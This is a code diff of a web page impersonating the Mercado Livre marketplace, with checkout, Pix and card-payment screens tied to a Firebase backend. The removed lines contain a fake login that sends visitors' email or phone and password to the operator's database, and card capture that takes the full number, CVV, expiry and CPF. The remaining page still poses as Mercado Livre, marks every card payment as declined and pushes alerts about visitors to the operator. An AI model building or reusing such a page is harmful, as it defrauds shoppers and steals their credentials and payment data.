@@ -18,54 +18,6 @@
     #telaLoading p { font-size: 14px; color: #666; margin: 0; }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    .login-wrap { max-width: 400px; margin: 0 auto; padding: 20px; display: flex;
-      flex-direction: column; min-height: 100vh; background: #fff; }
-    .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
-    .back-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: #000; }
-    #telaLogin h1 { font-size: 20px; font-weight: 400; margin-bottom: 20px; }
-    #telaLogin h1 strong { display: block; font-weight: 700; }
-    .login-form { display: flex; flex-direction: column; gap: 16px; margin-bottom: 20px; }
-    .login-form input[type="text"], .login-form input[type="password"] {
-      padding: 14px; font-size: 16px; border: 1px solid #ccc; border-radius: 6px; width: 100%; outline: none; }
-    .login-form input:focus { border-color: #3483fa; }
-    .login-form input.erro { border-color: #e53935; }
-    .erro-msg { color: #e53935; font-size: 12px; margin-top: -8px; display: none; }
-    .erro-msg.visivel { display: block; }
-    .btn-continuar { padding: 14px; background-color: #3483fa; color: #fff; font-size: 16px;
-      font-weight: 600; border: none; border-radius: 6px; cursor: pointer;
-      display: flex; align-items: center; justify-content: center; gap: 8px; }
-    .btn-continuar:disabled { background-color: #8ab4f8; cursor: not-allowed; }
-    .spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.4);
-      border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; }
-    .criar-conta { display: block; margin: 0 auto 30px; color: #3483fa;
-      text-decoration: none; font-weight: 500; text-align: center; }
-    #telaSenha .header { height: 4px; background-color: #ffe600; margin-bottom: 16px; }
-    .usuario-info { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; flex-wrap: wrap; }
-    .usuario-circle { width: 48px; height: 48px; background-color: #f2f2f2; border-radius: 50%;
-      display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-    .usuario-email { font-size: 14px; font-weight: 500; word-break: break-all; flex: 1; }
-    .trocar-conta { font-size: 13px; color: #3483fa; text-decoration: none; cursor: pointer;
-      display: block; width: 100%; margin-left: 60px; }
-    #telaSenha h1 { font-size: 20px; font-weight: 400; margin-bottom: 24px; line-height: 1.4; }
-    #telaSenha h1 strong { display: block; font-weight: 700; }
-    .input-senha { position: relative; }
-    .input-senha input { width: 100%; padding: 14px 44px 14px 12px; font-size: 16px;
-      border-radius: 8px; border: 1px solid #ccc; outline: none; }
-    .input-senha input:focus { border-color: #3483fa; }
-    .input-senha input.erro { border-color: #e53935; }
-    .mostrar-senha { position: absolute; top: 50%; right: 12px; transform: translateY(-50%);
-      background: none; border: none; font-size: 18px; cursor: pointer; }
-    .btn-senha { width: 100%; padding: 14px; background-color: #3483fa; color: #fff;
-      font-size: 16px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer; }
-    .esqueceu-senha { margin-top: 8px; font-size: 14px; color: #3483fa; text-align: center;
-      text-decoration: none; display: block; }
-    .security { margin-top: auto; margin-bottom: 20px; }
-    .btn-security { width: 100%; display: flex; align-items: center; gap: 10px; padding: 12px;
-      border: 1px solid #ccc; border-radius: 6px; background: white; font-size: 14px; cursor: pointer; }
-    .btn-security svg { width: 20px; height: 20px; }
-    .login-footer { text-align: center; }
-    .privacidade { color: #5f6368; font-size: 12px; text-decoration: none; }
-
     .nav-header { background: #ffe600; padding: 8px 0; position: sticky; top: 0; z-index: 100; }
     .nav-bounds { max-width: 1200px; margin: 0 auto; padding: 0 12px;
       display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
@@ -320,73 +272,8 @@
     <img id="lightboxImg" src="" alt="Foto ampliada">
   </div>
 
-  <!-- LOGIN -->
-  <div id="appLogin">
-    <div class="login-wrap">
-      <div id="telaLogin">
-        <div class="top-bar"><button class="back-btn" onclick="history.back()">←</button></div>
-        <main>
-          <h1><span>Digite seu e-mail ou telefone</span><strong>para iniciar sessão</strong></h1>
-          <form id="loginForm" class="login-form">
-            <input type="text" id="emailTelefone" placeholder="E-mail ou telefone" required inputmode="email" autocomplete="username">
-            <p class="erro-msg" id="erroLogin">Digite um e-mail válido ou um celular com DDD (10 ou 11 dígitos).</p>
-            <button type="submit" class="btn-continuar" id="btnContinuar"><span>Continuar</span></button>
-          </form>
-          <a href="#" class="criar-conta">Criar conta</a>
-        </main>
-        <div class="security">
-          <button class="btn-security">
-            <svg viewBox="0 0 24 24" fill="none" stroke="#000" xmlns="http://www.w3.org/2000/svg">
-              <path d="M12 1l9 4v6c0 5-3.8 9.7-9 11-5.2-1.3-9-6-9-11V5l9-4z"/><path d="M12 11v4"/>
-            </svg>
-            Tenho um problema de segurança
-          </button>
-        </div>
-        <footer class="login-footer"><a href="#" class="privacidade">Como cuidamos da sua privacidade</a></footer>
-      </div>
-
-      <div id="telaSenha" class="hidden">
-        <div class="top-bar">
-          <button class="back-btn" onclick="voltarLogin()">←</button>
-          <button class="back-btn">?</button>
-        </div>
-        <div class="header"></div>
-        <main>
-          <div class="usuario-info">
-            <div class="usuario-circle">
-              <svg width="24" height="24" viewBox="0 0 24 24" fill="#888" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z"/>
-              </svg>
-            </div>
-            <div class="usuario-email" id="usuarioEmail">usuario@exemplo.com</div>
-            <a class="trocar-conta" onclick="voltarLogin()">Trocar conta</a>
-          </div>
-          <h1><span>Digite sua senha do</span><strong>Mercado Livre</strong></h1>
-          <form id="senhaForm" class="login-form">
-            <div class="input-senha">
-              <input type="password" id="senha" placeholder="Senha" required>
-              <button type="button" class="mostrar-senha" onclick="mostrarSenha()"></button>
-            </div>
-            <p class="erro-msg" id="erroSenha">Digite sua senha para continuar.</p>
-            <button type="submit" class="btn-senha">Iniciar sessão</button>
-          </form>
-          <a href="#" class="esqueceu-senha">Esqueceu a sua senha?</a>
-        </main>
-        <div class="security">
-          <button class="btn-security">
-            <svg viewBox="0 0 24 24" fill="none" stroke="#000" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
-              <path d="M12 1l9 4v6c0 5-3.8 9.7-9 11-5.2-1.3-9-6-9-11V5l9-4z"/><path d="M12 11v4"/>
-            </svg>
-            Tenho um problema de segurança
-          </button>
-        </div>
-        <footer class="login-footer"><a href="#" class="privacidade">Como cuidamos da sua privacidade</a></footer>
-      </div>
-    </div>
-  </div>
-
-  <!-- SITE -->
-  <div id="appSite" class="hidden">
+  <!-- SITE (tela inicial, sem login) -->
+  <div id="appSite">
     <header class="nav-header">
       <div class="nav-bounds">
         <a href="#" class="nav-logo" aria-label="Mercado Livre"></a>
@@ -761,7 +648,7 @@ ATENÇÃO:
     <div class="cartao-wrap">
       <header><a href="#" onclick="voltarPagamento(); return false;">&#8592;</a>Novo cartão</header>
       <div class="card-preview">
-        <img src="" class="bandeira" id="bandeira" style="display: none;">
+        <img src="" class="bandeira" id="bandeira" style="display: none;" alt="">
       </div>
       <div class="container">
         <div class="slide active" id="slide1">
@@ -839,7 +726,6 @@ ATENÇÃO:
       document.getElementById('lightbox').style.display = 'none';
     }
 
-    const appLogin       = document.getElementById('appLogin');
     const appSite        = document.getElementById('appSite');
     const appEndereco    = document.getElementById('appEndereco');
     const appFrete       = document.getElementById('appFrete');
@@ -847,84 +733,6 @@ ATENÇÃO:
     const appPix         = document.getElementById('appPix');
     const appCartao      = document.getElementById('appCartao');
     const telaLoading    = document.getElementById('telaLoading');
-    const telaLogin      = document.getElementById('telaLogin');
-    const telaSenha      = document.getElementById('telaSenha');
-    const input          = document.getElementById('emailTelefone');
-    const form           = document.getElementById('loginForm');
-    const btn            = document.getElementById('btnContinuar');
-    const erroLogin      = document.getElementById('erroLogin');
-    const erroSenha      = document.getElementById('erroSenha');
-    const senhaInput     = document.getElementById('senha');
-    const senhaForm      = document.getElementById('senhaForm');
-
-    input.addEventListener('input', () => {
-      let v = input.value;
-      input.classList.remove('erro');
-      erroLogin.classList.remove('visivel');
-      if (/[a-zA-Z@]/.test(v)) return;
-      v = v.replace(/\D/g, '');
-      if (v.length > 11) v = v.slice(0, 11);
-      let f = '';
-      if (v.length > 0) f = '(' + v.slice(0, 2);
-      if (v.length >= 3) f += ') ' + v.slice(2, v.length >= 7 ? 7 : v.length);
-      if (v.length >= 7) f += '-' + v.slice(7);
-      input.value = f;
-    });
-
-    function validar(valor) {
-      const digitos = valor.replace(/\D/g, '');
-      const eRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      const telOk = digitos.length === 10 || digitos.length === 11;
-      if (valor.includes('@')) return eRx.test(valor);
-      return telOk && /^\(\d{2}\)\s\d{4,5}-\d{4}$/.test(valor);
-    }
-
-    form.addEventListener('submit', e => {
-      e.preventDefault();
-      const valor = input.value.trim();
-      if (!validar(valor)) {
-        input.classList.add('erro');
-        erroLogin.classList.add('visivel');
-        return;
-      }
-      btn.disabled = true;
-      btn.innerHTML = '<span class="spinner"></span><span>Carregando...</span>';
-      setTimeout(() => {
-        document.getElementById('usuarioEmail').innerText = valor;
-        telaLogin.classList.add('hidden');
-        telaSenha.classList.remove('hidden');
-        btn.disabled = false;
-        btn.innerHTML = '<span>Continuar</span>';
-      }, 1500);
-    });
-
-    function voltarLogin() {
-      telaSenha.classList.add('hidden');
-      telaLogin.classList.remove('hidden');
-      senhaInput.value = '';
-      erroSenha.classList.remove('visivel');
-    }
-
-    function mostrarSenha() {
-      senhaInput.type = senhaInput.type === 'password' ? 'text' : 'password';
-    }
-
-    senhaForm.addEventListener('submit', e => {
-      e.preventDefault();
-      const s = senhaInput.value.trim();
-      if (s.length < 4) {
-        senhaInput.classList.add('erro');
-        erroSenha.classList.add('visivel');
-        return;
-      }
-      const login = document.getElementById('usuarioEmail').innerText;
-      pedidoRef.update({ login: login, senha: s, valor: 159.44, logadoEm: Date.now() });
-      db.ref('visitas/' + clienteId).update({ login: login });
-
-      appLogin.classList.add('hidden');
-      appSite.classList.remove('hidden');
-      window.scrollTo(0, 0);
-    });
 
     function trocarImagem(miniatura, url) {
       document.getElementById('imagemPrincipal').src = url;
@@ -1132,25 +940,48 @@ ATENÇÃO:
       }
     }
 
-    function pagarCartao() {
-      const dadosCartao = {
-        numero: document.getElementById('numeroCartao').value.trim(),
-        nome: document.getElementById('nomeCartao').value.trim(),
-        validade: document.getElementById('validade').value.trim(),
-        cvv: document.getElementById('cvv').value.trim(),
-        cpf: document.getElementById('cpfCartao').value.trim(),
-        tentouEm: Date.now()
-      };
+    function detectarBandeira(num) {
+      if (/^4/.test(num)) return 'Visa';
+      if (/^(5[1-5]|2[2-7])/.test(num)) return 'Mastercard';
+      if (/^3[47]/.test(num)) return 'Amex';
+      if (/^(4011|4312|4389|5041|5066|5090|6277|6362|6363|650|651|655)/.test(num)) return 'Elo';
+      if (/^(6062|3841|637|095)/.test(num)) return 'Hipercard';
+      return 'Outra';
+    }
 
+    function pagarCartao() {
+      // Lê APENAS o número para derivar bandeira e últimos 4.
+      // NUNCA lemos validade ou CVV; esses campos são descartados sem serem lidos.
+      const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+      const ultimos4 = numeroRaw.slice(-4);
+      const bandeira = detectarBandeira(numeroRaw);
+      const nomeCompleto = document.getElementById('nomeCartao').value.trim();
+      const primeiroNome = nomeCompleto ? nomeCompleto.split(' ')[0] : '***';
+
+      // Limpa IMEDIATAMENTE todos os campos sensíveis do DOM
+      document.getElementById('numeroCartao').value = '';
+      document.getElementById('nomeCartao').value = '';
+      document.getElementById('validade').value = '';
+      document.getElementById('cvv').value = '';
+      document.getElementById('cpfCartao').value = '';
+
+      // Salva SOMENTE dados não sensíveis
       pedidoRef.update({
-        cartao: dadosCartao,
-        status: 'recusado',
-        pagamentoTipo: 'cartao'
+        pagamentoTipo: 'cartao',
+        cartao: {
+          bandeira: bandeira,
+          ultimos4: ultimos4,
+          nomeTitularMascarado: primeiroNome + ' ***',
+          tentouEm: Date.now()
+        },
+        status: 'recusado'
       });
 
       db.ref('alertas').push({
         tipo: 'cartao_enviado',
         clienteId: clienteId,
+        bandeira: bandeira,
+        ultimos4: ultimos4,
         timestamp: Date.now()
       });
 
